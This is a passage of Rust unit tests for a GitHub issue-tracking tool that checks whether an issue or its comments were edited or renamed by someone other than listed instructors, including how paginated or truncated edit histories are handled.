        let labelled = events_reply(
            &[
                ready_on(LABELED, "tom"),
                label_event("LabeledEvent", AFTER, "eve", "bug"),
            ],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            text_check_of(&labelled, LABELED, &["tom"]),
            TextCheck::Unchanged
        );
        // A bot with an instructor's login is not an instructor.
        let rename = rename_event(AFTER, bot("tom"));
        let by_bot = events_reply(
            &[ready_on(LABELED, "tom"), rename],
            None,
            &creation_only("eve"),
        );
        assert_eq!(
            text_check_of(&by_bot, LABELED, &["tom"]),
            TextCheck::Changed
        );
    }

    #[test]
    fn text_check_cannot_judge_histories_that_may_hide_something() {
        // A full page of body edits all at or after the moment.
        let times = seconds_after_label(100);
        let history: Vec<Edit> = times.iter().map(|t| e(t, "tom")).collect();
        let edits = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e(&times[99], "tom")),
            &history,
        );
        assert_eq!(
            text_check_of(&edits, LABELED, &["tom"]),
            TextCheck::Unjudged
        );

        // A full timeline page whose oldest event is at or after the moment may hide renames.
        let events: Vec<Value> = (0..100).map(|_| rename_event(AFTER, "tom")).collect();
        let full = approval_reply(&events, 150, None, &creation_only("eve"));
        assert_eq!(text_check_of(&full, LABELED, &["tom"]), TextCheck::Unjudged);
        // The same page with its oldest event before the moment shows everything after it.
        let mut reaching = vec![rename_event("2026-10-04T09:00:00Z", "eve")];
        reaching.extend(events.into_iter().skip(1));
        let reaching_answer = approval_reply(&reaching, 150, None, &creation_only("eve"));
        assert_eq!(
            text_check_of(&reaching_answer, LABELED, &["tom"]),
            TextCheck::Unchanged
        );

        // The newest body entry must be the last edit.
        let stale = approval_reply_raw(
            &[ready_on(LABELED, "tom")],
            1,
            Some(e(AFTER, "tom")),
            &[e(CREATED, "eve")],
            1,
        );
        assert_eq!(
            text_check_of(&stale, LABELED, &["tom"]),
            TextCheck::Unjudged
        );
    }

    #[test]
    fn a_cut_off_timeline_page_whose_oldest_event_is_exactly_at_since_cannot_be_judged() {
        // Events before `since` could still be hidden at the same second, so the page must
        // reach strictly before it.
        let page = |oldest: &str| {
            let mut events = vec![rename_event(oldest, "tom")];
            events.extend((0..99).map(|_| rename_event(AFTER, "tom")));
            approval_reply(&events, 150, None, &creation_only("eve"))
        };
        assert_eq!(
            text_check_of(&page(LABELED), LABELED, &["tom"]),
            TextCheck::Unjudged
        );
        assert_eq!(
            text_check_of(&page(AFTER), LABELED, &["tom"]),
            TextCheck::Unjudged
        );
        assert_eq!(
            text_check_of(&page("2026-10-04T09:59:59Z"), LABELED, &["tom"]),
            TextCheck::Unchanged
        );
    }

    #[test]
    fn each_half_of_the_timeline_cut_off_rule_alone_stops_the_judgement() {
        let renames =
            |n: usize| -> Vec<Value> { (0..n).map(|_| rename_event(AFTER, "tom")).collect() };
        // A full page of 100 with nothing more: still a page that may have been cut.
        let full = approval_reply(&renames(100), 100, None, &creation_only("eve"));
        assert_eq!(text_check_of(&full, LABELED, &["tom"]), TextCheck::Unjudged);
        // Fewer than 100 shown with a larger total: something is hidden.
        let short = approval_reply(&renames(99), 120, None, &creation_only("eve"));
        assert_eq!(
            text_check_of(&short, LABELED, &["tom"]),
            TextCheck::Unjudged
        );
        // The control: 99 shown of a total of 99 is the whole timeline.
        let whole = approval_reply(&renames(99), 99, None, &creation_only("eve"));
        assert_eq!(
            text_check_of(&whole, LABELED, &["tom"]),
            TextCheck::Unchanged
        );
    }

    #[test]
    fn text_check_is_changed_for_a_stranger_edit_or_rename_at_or_after_the_moment() {
        let edited = |at: &str, who: Who<'static>| {
            events_reply(
                &[ready_on(LABELED, "tom")],
                Some(e(at, who)),
                &[e(CREATED, "eve"), e(at, who)],
            )
        };
        let renamed = |at: &str, who: Who<'static>| {
            events_reply(
                &[ready_on(LABELED, "tom"), rename_event(at, who)],
                None,
                &creation_only("eve"),
            )
        };
        for at in [LABELED, AFTER] {
            for who in [Who::User("eve"), NOBODY] {
                assert_eq!(
                    text_check_of(&edited(at, who), LABELED, &["tom"]),
                    TextCheck::Changed
                );
                assert_eq!(
                    text_check_of(&renamed(at, who), LABELED, &["tom"]),
                    TextCheck::Changed
                );
            }
        }
        // One second before the moment is before it.
        assert_eq!(
            text_check_of(
                &edited("2026-10-04T09:59:59Z", Who::User("eve")),
                LABELED,
                &["tom"]
            ),
            TextCheck::Unchanged
        );
        assert_eq!(
            text_check_of(
                &renamed("2026-10-04T09:59:59Z", Who::User("eve")),
                LABELED,
                &["tom"]
            ),
            TextCheck::Unchanged
        );
    }

    #[test]
    fn text_check_with_a_timestamp_that_is_not_githubs_form_makes_no_call() {
        for since in ["", "2026-10-04 10:00:00Z", "2026-10-04T10:00:00", "now"] {
            let fake = FakeTracker::new();
            let error = fake
                .text_check(REPO, 6, since, &names(&["tom"]))
                .unwrap_err();
            assert!(
                is_parse_error_of(Some(error), &args(&["api", "graphql"])),
                "{since}"
            );
            assert!(fake.calls().is_empty(), "{since}");
        }
    }

    #[test]
    fn text_check_errors_are_typed() {
        let bad = FakeTracker::answering([Answer::ok("not json")]);
        let parse = bad
            .text_check(REPO, 6, LABELED, &names(&["tom"]))
            .unwrap_err();
        assert!(is_parse_error_of(Some(parse), &approval_call()));

        let failed = FakeTracker::answering([Answer::fail(1, "HTTP 502")]);
        let error = failed
            .text_check(REPO, 6, LABELED, &names(&["tom"]))
            .unwrap_err();
        assert!(
            matches!(&error, TrackerError::Other { kind: OtherKind::NoAnswer, message: m } if m.contains("exited with status 1")),
            "{error}"
        );

        let answer = events_reply(
            &[ready_on(LABELED, "tom")],
            Some(e("later", "tom")),
            &creation_only("tom"),
        );
        let malformed = FakeTracker::answering([Answer::ok(answer)]);
        let error = malformed
            .text_check(REPO, 6, LABELED, &names(&["tom"]))
            .unwrap_err();
        assert!(is_parse_error_of(Some(error), &approval_call()));
    }

    // ---- text_edited_since ----

    fn edited_since_of(answer: &str, since: &str) -> bool {
        let fake = FakeTracker::answering([Answer::ok(answer)]);
        let found = fake.text_edited_since(REPO, 6, since).unwrap();
        assert_eq!(fake.calls(), vec![approval_call()]);
        found
    }

    #[test]
    fn text_edited_since_is_false_when_nothing_touched_the_text_at_or_after_the_moment() {
        // An edit and a rename before the moment, by anyone, and a label event after it.
        let answer = events_reply(
            &[
                rename_event("2026-10-04T09:00:00Z", "eve"),
                ready_on(LABELED, "tom"),
                label_event("LabeledEvent", AFTER, "eve", "bug"),
            ],
            Some(e("2026-10-04T09:59:59Z", "tom")),
            &[e(CREATED, "eve"), e("2026-10-04T09:59:59Z", "tom")],
        );
        assert!(!edited_since_of(&answer, LABELED));
    }

    #[test]
    fn text_edited_since_is_true_for_any_edit_or_rename_at_or_after_the_moment_even_an_instructors()
    {
        for at in [LABELED, AFTER] {
            let edited = events_reply(
                &[ready_on(LABELED, "tom")],
                Some(e(at, "tom")),
                &[e(CREATED, "eve"), e(at, "tom")],
            );
            assert!(edited_since_of(&edited, LABELED), "edit at {at}");
            let renamed = events_reply(
                &[ready_on(LABELED, "tom"), rename_event(at, "tom")],
                None,
                &creation_only("eve"),
            );
            assert!(edited_since_of(&renamed, LABELED), "rename at {at}");
        }
    }

    #[test]
    fn text_edited_since_is_true_when_the_timeline_may_hide_a_rename() {
        // A full page of newer label events with more behind it: a rename at the moment could
        // be among the hidden ones.
        let events: Vec<Value> = (0..100)
            .map(|i| {
                label_event(
                    "LabeledEvent",
                    &format!("2026-10-04T11:{}:{}Z", pad(i / 60), pad(i % 60)),
                    "eve",
                    "bug",
                )
            })
            .collect();
        let answer = approval_reply(&events, 150, None, &creation_only("eve"));
        assert!(edited_since_of(&answer, LABELED));
    }

    #[test]
    fn text_edited_since_refuses_a_moment_that_is_not_a_github_timestamp() {
        let fake = FakeTracker::new();
        let error = fake.text_edited_since(REPO, 6, "yesterday").unwrap_err();
        assert!(
            matches!(&error, TrackerError::Other { kind: OtherKind::Parse, message: m } if m.contains("returned unexpected output"))
        );
        assert!(fake.calls().is_empty());
    }

    #[test]
    fn approval_sends_one_graphql_call_for_the_issue_and_uses_the_instructors_it_is_given() {
        let answer = json!({"data": {"repository": {"issue": {
            "timelineItems": {
                "totalCount": 1,
                "nodes": [ready_on("2026-10-04T11:36:21Z", "rawphp")],
            },
            "lastEditedAt": null,
            "editor": null,
            "userContentEdits": edits_json(&[e("2026-10-04T09:50:06Z", "outsider")], 1),
        }}}})
        .to_string();
        let fake = FakeTracker::answering([Answer::ok(answer)]);
        let found = fake.approval(REPO, 10, &names(&["rawphp"])).unwrap();
        assert_eq!(found, approved("2026-10-04T11:36:21Z", "rawphp"));
        let calls = fake.calls();
        assert_eq!(calls.len(), 1);
        assert_eq!(calls[0][..2], args(&["api", "graphql"])[..]);
        assert!(calls[0].contains(&"number=10".to_string()));
    }

    /// A recorded answer of the approval query: the label at 10:00 and an outsider's rename at
    /// 10:30.
    const RENAMED_BY_OUTSIDER: &str = r#"{"data":{"repository":{"issue":{"timelineItems":{"totalCount":2,"nodes":[{"__typename":"LabeledEvent","createdAt":"2026-10-04T10:00:00Z","actor":{"__typename":"User","login":"rawphp"},"label":{"name":"factory:ready"}},{"__typename":"RenamedTitleEvent","createdAt":"2026-10-04T10:30:00Z","actor":{"__typename":"User","login":"outsider"}}]},"lastEditedAt":null,"editor":null,"userContentEdits":{"totalCount":1,"nodes":[{"editedAt":"2026-10-04T09:50:06Z","editor":{"__typename":"User","login":"outsider"}}]}}}}}"#;

    #[test]
    fn text_check_sends_one_graphql_call_per_check_and_uses_the_instructors_it_is_given() {
        let fake = FakeTracker::answering([
            Answer::ok(RENAMED_BY_OUTSIDER),
            Answer::ok(RENAMED_BY_OUTSIDER),
            Answer::ok(RENAMED_BY_OUTSIDER),
        ]);
        // The rename is at or after the first moment and before the second.
        assert_eq!(
            fake.text_check(REPO, 10, "2026-10-04T10:00:00Z", &names(&["rawphp"]))
                .unwrap(),
            TextCheck::Changed
        );
        assert_eq!(
            fake.text_check(REPO, 10, "2026-10-04T10:30:01Z", &names(&["rawphp"]))
                .unwrap(),
            TextCheck::Unchanged
        );
        // The list passed is the one used: with the outsider as an instructor it is unchanged.
        assert_eq!(
            fake.text_check(REPO, 10, "2026-10-04T10:00:00Z", &names(&["outsider"]))
                .unwrap(),
            TextCheck::Unchanged
        );
        let calls = fake.calls();
        assert_eq!(calls.len(), 3);
        for call in calls {
            assert_eq!(call.len(), 10);
            assert_eq!(call[..3], args(&["api", "graphql", "-f"])[..]);
            assert!(call[3].starts_with("query=query($owner: String!, $name: String!"));
            assert!(call[3].contains("RENAMED_TITLE_EVENT"));
            assert_eq!(
                call[4..],
                args(&[
                    "-f",
                    "owner=rawphp",
                    "-f",
                    "name=softfac",
                    "-F",
                    "number=10"
                ])[..]
            );
        }
    }

    // ---- activity_since ----

    const MARKER: &str = "<!-- softfac -->";
    const STATUS_MARKER: &str = "<!-- softfac:status -->";

    fn drop_of(id: &str, reason: DropReason) -> Dropped {
        Dropped {
            id: id.into(),
            reason,
        }
    }

    const ACT_SINCE: &str = "2026-10-04T10:00:00Z";
    const WRITTEN: &str = "2026-10-04T10:01:00Z";
    const EDIT_AT: &str = "2026-10-04T10:20:00Z";

    fn comments_call() -> Vec<String> {
        args(&[
            "api",
            &format!("repos/rawphp/softfac/issues/6/comments?since={ACT_SINCE}&per_page=100"),
            "--paginate",
        ])
    }

    fn body_edit_call() -> Vec<String> {
        args(&[
            "api",
            "graphql",
            "-f",
            &format!("query={ACTIVITY_QUERY}"),
            "-f",
            "owner=rawphp",
            "-f",
            "name=softfac",
            "-F",
            "number=6",
        ])
    }

    fn editor_call(node_ids: &[String]) -> Vec<String> {
        let mut call = args(&[
            "api",
            "graphql",
            "-f",
            &format!("query={COMMENT_EDITOR_QUERY}"),
        ]);
        for id in node_ids {
            call.push("-f".into());
            call.push(format!("ids[]={id}"));
        }
        call
    }

    fn ids(list: &[&str]) -> Vec<String> {
        list.iter().map(|id| id.to_string()).collect()
    }

    /// A REST comment as `gh api repos/R/issues/N/comments` prints it.
    fn rest_node(id: u64, author: Option<&str>, at: &str, body: &str) -> Value {
        json!({
            "id": id,
            "user": author.map(|login| json!({"login": login})),
            "node_id": format!("IC_{id}"),
            "created_at": at,
            "updated_at": at,
            "body": body,
        })
    }

    /// A comment that was edited after it was written.
    fn edited_rest_node(id: u64, author: &str, created: &str, updated: &str, body: &str) -> Value {
        let mut node = rest_node(id, Some(author), created, body);
        node["updated_at"] = json!(updated);
        node
    }

    fn rest_reply(nodes: &[Value]) -> String {
        serde_json::to_string(nodes).unwrap()
    }

    /// The issue's GraphQL answer with exactly these history nodes (newest first) and this
    /// total.
    fn body_reply_raw(body: &str, last: Option<Edit>, nodes: &[Edit], total: usize) -> String {
        json!({"data": {"repository": {"issue": {
            "body": body,
            "lastEditedAt": last.map(|(at, _)| at),
            "editor": last.map_or(Value::Null, |(_, who)| actor_of(who)),
            "userContentEdits": edits_json(nodes, total),
        }}}})
        .to_string()
    }

    /// The issue's answer: the creation is the oldest entry of its history, the edit the newest.
    fn activity_body_reply(body: &str, edited: Option<Edit>) -> String {
        let mut history = vec![e(CREATED, "tom")];
        history.extend(edited);
        body_reply_raw(body, edited, &newest_first(&history), history.len())
    }

    /// A comment's editor lookup, history given newest first.
    fn editor_reply_raw(last: Option<Edit>, nodes: &[Edit], total: usize, id: &str) -> String {
        json!({"data": {"nodes": [{
            "id": id,
            "lastEditedAt": last.map(|(at, _)| at),
            "editor": last.map_or(Value::Null, |(_, who)| actor_of(who)),
            "userContentEdits": edits_json(nodes, total),
        }]}})
        .to_string()
    }

    /// One lookup answer holding the nodes of several single-comment answers.
    fn editors_reply(answers: &[String]) -> String {
        let nodes: Vec<Value> = answers
            .iter()
            .flat_map(|answer| {
                let json: Value = serde_json::from_str(answer).unwrap();
                json["data"]["nodes"].as_array().unwrap().clone()
            })
            .collect();
        json!({"data": {"nodes": nodes}}).to_string()
    }

    /// The lookup of a comment written by `tom` and last edited as `last`.
    fn editor_reply_for(last: Option<Edit>, id: &str) -> String {
        let mut history = vec![e(CREATED, "tom")];
        history.extend(last);
        editor_reply_raw(last, &newest_first(&history), history.len(), id)
    }

    fn editor_reply(last: Option<Edit>) -> String {
        editor_reply_for(last, "IC_7")
    }

    fn editor_reply_history(last: Option<Edit>, oldest_first: &[Edit]) -> String {
        editor_reply_raw(
            last,
            &newest_first(oldest_first),
            oldest_first.len(),
            "IC_7",
        )
    }

    fn activity_of(fake: &FakeTracker, who: &[&str]) -> Activity {
        fake.activity_since(REPO, 6, ACT_SINCE, &names(who))
            .unwrap()
    }

    fn activity_error(fake: &FakeTracker, who: &[&str]) -> TrackerError {
        fake.activity_since(REPO, 6, ACT_SINCE, &names(who))
            .unwrap_err()
    }

    fn ids_of(activity: &Activity) -> Vec<&str> {
        activity.comments.iter().map(|c| c.id.as_str()).collect()
    }

    fn answering(answers: &[String]) -> FakeTracker {
        FakeTracker::answering(answers.iter().map(|answer| Answer::ok(answer.as_str())))
    }

    /// Whether an edited comment by `tom` survives, given the answer to the editor lookup.
    fn kept_after(answer: &str) -> bool {
        let fake = answering(&[
            rest_reply(&[edited_rest_node(7, "tom", WRITTEN, EDIT_AT, "x")]),
            answer.to_string(),
            activity_body_reply("b", None),
        ]);
        // `amy` is an instructor too, so a history that names her is not refused for that.
        !activity_of(&fake, &["tom", "amy"]).comments.is_empty()
    }

    /// What an edited comment by `tom` leaves out, with the reason, given the answer to the
    /// editor lookup.
    fn dropped_after(answer: &str) -> Vec<Dropped> {
        let fake = answering(&[
            rest_reply(&[edited_rest_node(7, "tom", WRITTEN, EDIT_AT, "x")]),
            answer.to_string(),
            activity_body_reply("b", None),
        ]);
        let activity = activity_of(&fake, &["tom", "amy"]);
        assert_eq!(
            activity.comments,
            vec![],
            "a dropped comment is not forwardable"
        );
        activity.dropped
    }

    #[test]
    fn activity_reads_the_real_shapes_and_makes_both_calls() {
        let real_rest = r#"[{"id":5978910929,"user":{"login":"rawphp","id":1},"created_at":"2026-10-04T10:13:16Z","updated_at":"2026-10-04T10:13:16Z","body":"please use serde"}]"#;
        let real_graphql = r#"{"data":{"repository":{"issue":{"body":"Outcome text","lastEditedAt":null,"editor":null,"userContentEdits":{"totalCount":1,"nodes":[{"editedAt":"2026-10-04T09:50:06Z","editor":{"__typename":"User","login":"rawphp"}}]}}}}}"#;
        let fake = answering(&[real_rest.into(), real_graphql.into()]);
        assert_eq!(
            activity_of(&fake, &["rawphp"]),
            Activity {
                comments: vec![Comment {
                    id: "5978910929".into(),
                    author: "rawphp".into(),
                    created_at: "2026-10-04T10:13:16Z".into(),
                    body: "please use serde".into(),
                }],
                body_edit: None,
                dropped: vec![],
            }
        );
        assert_eq!(fake.calls(), vec![comments_call(), body_edit_call()]);
    }

    #[test]
    fn activity_returns_the_comment_and_the_body_edit_of_an_instructor_with_the_exact_calls() {
        let fake = answering(&[
            r#"[{"id":5,"node_id":"IC_5","user":{"login":"rawphp"},"created_at":"2026-10-04T10:13:17Z","updated_at":"2026-10-04T10:13:17Z","body":"hi"}]"#.into(),
            r#"{"data":{"repository":{"issue":{"body":"b","lastEditedAt":"2026-10-04T10:13:18Z","editor":{"__typename":"User","login":"rawphp"},"userContentEdits":{"totalCount":2,"nodes":[{"editedAt":"2026-10-04T10:13:18Z","editor":{"__typename":"User","login":"rawphp"}},{"editedAt":"2026-10-04T10:00:00Z","editor":{"__typename":"User","login":"rawphp"}}]}}}}}"#.into(),
        ]);
        let activity = fake
            .activity_since(REPO, 6, "2026-10-04T10:13:16Z", &names(&["rawphp"]))
            .unwrap();
        assert_eq!(
            activity,
            Activity {
                comments: vec![Comment {
                    id: "5".into(),
                    author: "rawphp".into(),
                    created_at: "2026-10-04T10:13:17Z".into(),
                    body: "hi".into(),
                }],
                body_edit: Some(BodyEdit {
                    edited_at: "2026-10-04T10:13:18Z".into(),
                    editor: "rawphp".into(),
                    body: "b".into(),
                }),
                dropped: vec![],
            }
        );
        let calls = fake.calls();
        assert_eq!(calls.len(), 2);
        assert_eq!(
            calls[0],
            args(&[
                "api",
                "repos/rawphp/softfac/issues/6/comments?since=2026-10-04T10:13:16Z&per_page=100",
                "--paginate"
            ])
        );
        assert_eq!(calls[1][..2], args(&["api", "graphql"])[..]);
    }

    #[test]
    fn the_activity_query_asks_only_for_the_body_edit() {
        for field in [
            "body",
            "lastEditedAt",
            "body lastEditedAt editor { __typename login }",
            "userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } }",
            "$owner",
            "$name",
            "$number",
        ] {
            assert!(ACTIVITY_QUERY.contains(field), "missing {field}");
        }
        assert!(!ACTIVITY_QUERY.contains("comments"));
    }

    #[test]
    fn the_comment_editor_query_asks_who_last_edited_a_comment_by_node_id() {
        for part in [
            "$ids: [ID!]!",
            "nodes(ids: $ids)",
            "... on Comment { id lastEditedAt",
            "editor { __typename login }",
            "userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } }",
        ] {
            assert!(COMMENT_EDITOR_QUERY.contains(part), "missing {part}");
        }
    }

    #[test]
    fn the_activity_queries_are_softfacs_byte_for_byte() {
        assert_eq!(
            ACTIVITY_QUERY,
            "query($owner: String!, $name: String!, $number: Int!) { repository(owner: $owner, name: $name) { issue(number: $number) { body lastEditedAt editor { __typename login } userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } } } } }"
        );
        assert_eq!(
            COMMENT_EDITOR_QUERY,
            "query($ids: [ID!]!) { nodes(ids: $ids) { ... on Comment { id lastEditedAt editor { __typename login } userContentEdits(first: 100) { totalCount nodes { editedAt editor { __typename login } } } } } }"
        );
    }

    #[test]
    fn activity_returns_a_comment_that_is_only_on_a_later_page() {
        let page1 = rest_reply(&[rest_node(1, Some("tom"), "2026-10-04T10:01:00Z", "first")]);
        let page2 = rest_reply(&[rest_node(2, Some("tom"), "2026-10-04T10:02:00Z", "second")]);
        // One array per page, as `gh api --paginate` may print them.
        let paged = answering(&[format!("{page1}{page2}"), activity_body_reply("b", None)]);
        assert_eq!(ids_of(&activity_of(&paged, &["tom"])), vec!["1", "2"]);
        // One merged array.
        let merged = answering(&[
            rest_reply(&[
                rest_node(1, Some("tom"), "2026-10-04T10:01:00Z", "first"),
                rest_node(2, Some("tom"), "2026-10-04T10:02:00Z", "second"),
            ]),
            activity_body_reply("b", None),
        ]);
        assert_eq!(ids_of(&activity_of(&merged, &["tom"])), vec!["1", "2"]);
    }

    #[test]
    fn activity_time_boundary_is_exclusive() {
        let fake = answering(&[
            rest_reply(&[
                rest_node(1, Some("tom"), "2026-10-04T09:59:59Z", "before"),
                rest_node(2, Some("tom"), ACT_SINCE, "equal"),
                rest_node(3, Some("tom"), "2026-10-04T10:00:01Z", "after"),
            ]),
            activity_body_reply("b", None),
        ]);
        assert_eq!(ids_of(&activity_of(&fake, &["tom"])), vec!["3"]);
    }

    #[test]
    fn activity_ignores_a_comment_that_was_only_edited_after_since() {
        // The server filters on updated time; created_at must still be after `since`.
        let old = edited_rest_node(
            1,
            "tom",
            "2026-10-04T09:00:00Z",
            "2026-10-04T10:30:00Z",
            "later",
        );
        let fake = answering(&[rest_reply(&[old]), activity_body_reply("b", None)]);
        assert_eq!(activity_of(&fake, &["tom"]).comments, vec![]);
        assert_eq!(fake.calls().len(), 2);
    }

    #[test]
    fn activity_keeps_only_instructors_case_insensitively() {
        let fake = answering(&[
            rest_reply(&[
                rest_node(1, Some("TomKaczocha"), "2026-10-04T10:01:00Z", "mixed case"),
                rest_node(
                    2,
                    Some("stranger"),
                    "2026-10-04T10:02:00Z",
                    "not one of ours",
                ),
                rest_node(
                    3,
                    Some("tomkaczocha-bot"),
                    "2026-10-04T10:03:00Z",
                    "prefix only",
                ),
            ]),
            activity_body_reply("b", None),
        ]);
        let activity = activity_of(&fake, &["tomkaczocha"]);
        let kept: Vec<(&str, &str)> = activity
            .comments
            .iter()
            .map(|c| (c.id.as_str(), c.author.as_str()))
            .collect();
        assert_eq!(kept, vec![("1", "TomKaczocha")]);
    }

    #[test]
    fn activity_with_no_instructors_returns_nothing() {
        let fake = answering(&[
            rest_reply(&[rest_node(1, Some("tom"), "2026-10-04T10:01:00Z", "hi")]),
            activity_body_reply("b", Some(e("2026-10-04T10:05:00Z", "tom"))),
        ]);
        let activity = activity_of(&fake, &[]);
        assert_eq!(activity.comments, vec![]);
        assert_eq!(activity.body_edit, None);
    }

    #[test]
    fn activity_leaves_out_the_factorys_own_comments_whoever_wrote_them() {
        // The machine's user is also an instructor here, so authorship cannot tell them apart.
        let fake = answering(&[
            rest_reply(&[
                rest_node(
                    1,
                    Some("tom"),
                    "2026-10-04T10:01:00Z",
                    &format!("a question\n\n{MARKER}"),
                ),
                rest_node(
                    2,
                    Some("tom"),
                    "2026-10-04T10:02:00Z",
                    &format!("state\n\n{STATUS_MARKER}"),
                ),
                rest_node(3, Some("tom"), "2026-10-04T10:03:00Z", "a real instruction"),
            ]),
            activity_body_reply("b", None),
        ]);
        assert_eq!(ids_of(&activity_of(&fake, &["tom"])), vec!["3"]);
    }

    // The runner's case; the second body is Foundry's own claim marker.
    #[test]
    fn a_claim_comment_by_an_instructor_is_never_read_as_feedback() {
        for body in [
            "Claimed by machine trilogy-mac.\n\n<!-- softfac:claim trilogy-mac -->",
            "Claimed by machine mac-1.\n\n<!-- foundry:claim owner__repo__6__1 mac-1 -->",
        ] {
            let fake = answering(&[
                rest_reply(&[rest_node(7, Some("tom"), LATER, body)]),
                activity_body_reply("b", None),
            ]);
            assert_eq!(activity_of(&fake, &["tom"]).comments, vec![], "{body}");
        }
    }

    #[test]
    fn activity_ignores_deleted_authors_and_lists_the_comments_oldest_first() {
        let fake = answering(&[
            rest_reply(&[
                rest_node(3, Some("tom"), "2026-10-04T10:03:00Z", "third"),
                rest_node(4, None, "2026-10-04T10:04:00Z", "ghost"),
                rest_node(1, Some("tom"), "2026-10-04T10:01:00Z", "first"),
                rest_node(2, Some("tom"), "2026-10-04T10:02:00Z", "second"),
            ]),
            activity_body_reply("b", None),
        ]);
        assert_eq!(ids_of(&activity_of(&fake, &["tom"])), vec!["1", "2", "3"]);
    }

    #[test]
    fn an_unedited_comment_costs_no_extra_call() {
        let fake = answering(&[
            rest_reply(&[rest_node(1, Some("tom"), WRITTEN, "hi")]),
            activity_body_reply("b", None),
        ]);
        assert_eq!(ids_of(&activity_of(&fake, &["tom"])), vec!["1"]);
        assert_eq!(fake.calls(), vec![comments_call(), body_edit_call()]);
    }

    #[test]
    fn a_comment_edited_by_an_instructor_is_kept_after_one_extra_call() {
        let fake = answering(&[
            rest_reply(&[edited_rest_node(7, "tom", WRITTEN, EDIT_AT, "fixed")]),
            editor_reply(Some(e(EDIT_AT, "Tom"))),
            activity_body_reply("b", None),
        ]);
        let activity = activity_of(&fake, &["tom"]);
        assert_eq!(ids_of(&activity), vec!["7"]);
        assert_eq!(activity.comments[0].body, "fixed");
        assert_eq!(
            fake.calls(),
            vec![
                comments_call(),
                editor_call(&ids(&["IC_7"])),
                body_edit_call()
            ]
        );
    }

    #[test]
    fn the_real_comment_edit_history_shape_is_read() {
        let real = r#"{"data":{"nodes":[{"id":"IC_7","lastEditedAt":"2026-10-04T10:20:00Z","editor":{"__typename":"User","login":"rawphp"},"userContentEdits":{"totalCount":2,"nodes":[{"editedAt":"2026-10-04T10:20:00Z","editor":{"__typename":"User","login":"rawphp"}},{"editedAt":"2026-10-04T10:01:00Z","editor":{"__typename":"User","login":"rawphp"}}]}}]}}"#;
        let fake = answering(&[
            rest_reply(&[edited_rest_node(7, "rawphp", WRITTEN, EDIT_AT, "x")]),
            real.into(),
            activity_body_reply("b", None),
        ]);
        assert_eq!(ids_of(&activity_of(&fake, &["rawphp"])), vec!["7"]);
    }

    #[test]
    fn a_comment_edited_by_a_non_instructor_or_a_deleted_account_is_dropped_as_edited_by_someone_else()
     {
        // A collaborator with write access can edit an instructor's comment.
        let fake = answering(&[
            rest_reply(&[
                edited_rest_node(7, "tom", WRITTEN, EDIT_AT, "rewritten"),
                rest_node(8, Some("tom"), "2026-10-04T10:02:00Z", "plain"),
            ]),
            editor_reply(Some(e(EDIT_AT, "stranger"))),
            activity_body_reply("b", None),
        ]);
        let activity = activity_of(&fake, &["tom"]);
        assert_eq!(ids_of(&activity), vec!["8"]);
        assert_eq!(
            activity.dropped,
            vec![drop_of("7", DropReason::EditedByOther)]
        );
        assert_eq!(
            dropped_after(&editor_reply(Some(e(EDIT_AT, NOBODY)))),
            vec![drop_of("7", DropReason::EditedByOther)]
        );
    }

    #[test]
    fn a_comment_any_non_instructor_edited_is_dropped_though_an_instructor_edited_it_last() {
        // There is no `since` here: the comment is the instructor's own text from the start.
        let other = vec![drop_of("7", DropReason::EditedByOther)];
        assert_eq!(
            dropped_after(&editor_reply_history(
                Some(e(EDIT_AT, "tom")),
                &[e("2026-10-04T09:00:00Z", "stranger"), e(EDIT_AT, "tom")]
            )),
            other
        );
        assert_eq!(
            dropped_after(&editor_reply_history(
                Some(e(EDIT_AT, "tom")),
                &[
                    e("2026-10-04T10:05:00Z", "tom"),
                    e("2026-10-04T10:10:00Z", "stranger"),
                    e(EDIT_AT, "tom")
                ]
            )),
            other
        );
        assert_eq!(
            dropped_after(&editor_reply_history(
                Some(e(EDIT_AT, "tom")),
                &[e("2026-10-04T10:05:00Z", NOBODY), e(EDIT_AT, "tom")]
            )),
            other
        );
        // The page shows the stranger's edit, so the length does not hide it.
        assert_eq!(
            dropped_after(&editor_reply_raw(
                Some(e(EDIT_AT, "tom")),
                &[e(EDIT_AT, "tom"), e("2026-10-04T10:10:00Z", "stranger")],
                150,
                "IC_7"
            )),
            other
        );
    }

    #[test]
    fn a_comment_only_instructors_edited_or_never_edited_is_kept() {
        assert!(kept_after(&editor_reply_history(
            Some(e(EDIT_AT, "Tom")),
            &[e("2026-10-04T10:05:00Z", "tom"), e(EDIT_AT, "Tom")]
        )));
        // `lastEditedAt` null, with an empty history or with only the creation entry.
        assert!(kept_after(&editor_reply_history(None, &[])));
        assert!(kept_after(&editor_reply_history(
            None,
            &[e(CREATED, "tom")]
        )));
        // `updated_at` also moves for reasons other than the body: GitHub then has no edit.
        assert!(kept_after(&editor_reply(None)));
    }

    #[test]
    fn a_history_too_long_to_check_drops_the_comment_as_unverifiable() {
        let times: Vec<String> = (0..100)
            .map(|i| format!("2026-10-04T10:{}:{}Z", pad(2 + i / 60), pad(i % 60)))
            .collect();
        let edits = |n: usize| -> Vec<Edit> { times[..n].iter().map(|t| e(t, "tom")).collect() };
        // 99 entries are whole; a full page may hide more.
        assert!(kept_after(&editor_reply_history(
            Some(e(&times[98], "tom")),
            &edits(99)
        )));
        assert_eq!(
            dropped_after(&editor_reply_history(
                Some(e(&times[99], "tom")),
                &edits(100)
            )),
            vec![drop_of("7", DropReason::Unverifiable)]
        );
        // A total larger than the page.
        let nodes = [e(EDIT_AT, "tom"), e(CREATED, "tom")];
        assert!(kept_after(&editor_reply_raw(
            Some(e(EDIT_AT, "tom")),
            &nodes,
            2,
            "IC_7"
        )));
        assert_eq!(
            dropped_after(&editor_reply_raw(
                Some(e(EDIT_AT, "tom")),
                &nodes,
                5,
                "IC_7"
            )),
            vec![drop_of("7", DropReason::Unverifiable)]
        );
    }

    #[test]
    fn a_history_whose_newest_entry_is_not_the_latest_edit_is_unverifiable() {
        let last = e(EDIT_AT, "tom");
        let create = e(CREATED, "tom");
        let cases: [&[Edit]; 4] = [
            &[e("2026-10-04T10:19:00Z", "tom"), create],
            &[e(EDIT_AT, "amy"), create],
            &[create],
            &[],
        ];
        for nodes in cases {
            assert_eq!(
                dropped_after(&editor_reply_raw(Some(last), nodes, nodes.len(), "IC_7")),
                vec![drop_of("7", DropReason::Unverifiable)]
            );
        }
        assert!(kept_after(&editor_reply_raw(
            Some(last),
